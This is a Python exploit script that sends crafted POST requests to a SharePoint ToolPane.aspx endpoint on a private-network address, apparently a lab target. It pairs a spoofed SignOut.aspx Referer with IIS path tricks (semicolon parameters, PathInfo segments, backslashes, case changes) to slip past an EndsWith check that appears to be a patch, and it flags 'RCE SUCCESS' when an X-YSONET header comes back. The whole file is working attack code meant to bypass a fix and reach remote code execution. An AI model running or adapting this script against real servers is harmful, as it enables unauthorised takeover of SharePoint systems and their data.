#!/usr/bin/env python3
"""
Test IIS-specific path manipulation bypasses
Purpose: Find IIS routing tricks that bypass EndsWith check but still reach ToolPane.aspx handler
"""
import requests

requests.packages.urllib3.disable_warnings()

def test_iis_bypass(target, path, description):
    """Test IIS path manipulation"""
    url = f"{target}{path}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Referer": "/_layouts/SignOut.aspx",
    }
    
    print(f"\n[*] Testing: {description}")
    print(f"    Path: {path}")
    
    try:
        response = requests.post(url, headers=headers, data="MSOTlPn_DWP=test&MSOTlPn_Uri=test", verify=False, timeout=30, allow_redirects=False)
        print(f"    Status: {response.status_code}")
        
        if "X-YSONET" in response.headers:
            print(f"    [!!!] RCE SUCCESS - X-YSONET header found!")
            return True
        elif response.status_code == 200:
            if "Error" in response.text[:500] or "ToolPane" in response.text[:500]:
                print(f"    Possible success - checking response...")
                print(f"    Response snippet: {response.text[:200]}")
        elif response.status_code == 401:
            print(f"    Blocked (401)")
        else:
            print(f"    Unexpected status: {response.status_code}")
    except Exception as e:
        print(f"    Error: {str(e)}")
    
    return False

if __name__ == "__main__":
    target = "http://10.10.10.166"
    
    # IIS path manipulation tests
    tests = [
        # IIS path parameters (semicolons)
        ("/_layouts/15/ToolPane.aspx;param?DisplayMode=Edit&foo=/ToolPane.aspx", "IIS path parameter (;param)"),
        ("/_layouts/15/ToolPane.aspx;.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "IIS path parameter (;.aspx)"),
        ("/_layouts/15/ToolPane.aspx;x=y?DisplayMode=Edit&foo=/ToolPane.aspx", "IIS path parameter (;x=y)"),
        
        # IIS PathInfo
        ("/_layouts/15/ToolPane.aspx/.?DisplayMode=Edit&foo=/ToolPane.aspx", "PathInfo /."),
        ("/_layouts/15/ToolPane.aspx/..?DisplayMode=Edit&foo=/ToolPane.aspx", "PathInfo /.."),
        ("/_layouts/15/ToolPane.aspx/x?DisplayMode=Edit&foo=/ToolPane.aspx", "PathInfo /x"),
        
        # Alternative separators
        ("/_layouts/15/ToolPane.aspx\\?DisplayMode=Edit&foo=/ToolPane.aspx", "Backslash separator"),
        ("/_layouts/15/ToolPane.aspx%5c?DisplayMode=Edit&foo=/ToolPane.aspx", "Encoded backslash"),
        
        # Case variations with IIS tricks
        ("/_layouts/15/ToolPane.ASPX;x?DisplayMode=Edit&foo=/ToolPane.aspx", "ASPX uppercase + semicolon"),
        ("/_layouts/15/toolpane.aspx;x?DisplayMode=Edit&foo=/ToolPane.aspx", "toolpane lowercase + semicolon"),
    ]
    
    for path, desc in tests:
        test_iis_bypass(target, path, desc)

